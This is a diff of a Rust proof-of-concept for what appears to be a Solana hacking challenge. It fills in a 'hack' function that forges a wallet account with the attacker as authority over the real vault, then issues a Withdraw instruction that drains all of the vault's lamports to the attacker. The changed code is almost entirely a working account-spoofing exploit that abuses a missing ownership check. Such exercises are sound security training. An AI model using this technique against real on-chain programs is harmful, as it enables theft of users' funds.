@@ -1,5 +1,8 @@
 use std::{env, str::FromStr};
 
+use borsh::BorshSerialize;
+
+use level0::{Wallet, WalletInstruction};
 use owo_colors::OwoColorize;
 
 use poc_framework::solana_sdk::signature::Keypair;
@@ -8,6 +11,7 @@ use poc_framework::{
 };
 
 use pocs::assert_tx_success;
+use solana_program::instruction::{AccountMeta, Instruction};
 use solana_program::native_token::lamports_to_sol;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
 
@@ -20,13 +24,40 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
 
     // Step 0: how much money do we want to steal?
+    let amount_to_steal = env.get_account(challenge.vault_address).unwrap().lamports;
+    println!("Stealing {} lamports...", amount_to_steal);
 
     // Step 1: a fake wallet with the same vault
+    let hacker_wallet = Wallet {
+        authority: challenge.hacker.pubkey(),
+        vault: challenge.vault_address,
+    };
+    let fake_wallet = keypair(123);
+    let mut hacker_wallet_data: Vec<u8> = vec![];
+
+    hacker_wallet.serialize(&mut hacker_wallet_data).unwrap();
+
+    env.create_account_with_data(&fake_wallet, hacker_wallet_data);
 
     // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker
+    // The hacker signs the transaction //
+    let signers = &[&challenge.hacker];
+    env.execute_as_transaction(&[
+        Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(fake_wallet.pubkey(), false),
+                AccountMeta::new(challenge.vault_address, false),
+                AccountMeta::new(challenge.hacker.pubkey(), true),
+                AccountMeta::new(challenge.hacker.pubkey(), false),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw { amount: amount_to_steal }.try_to_vec().unwrap(),
+        },
+    ], signers).print();
 }
 
 /*
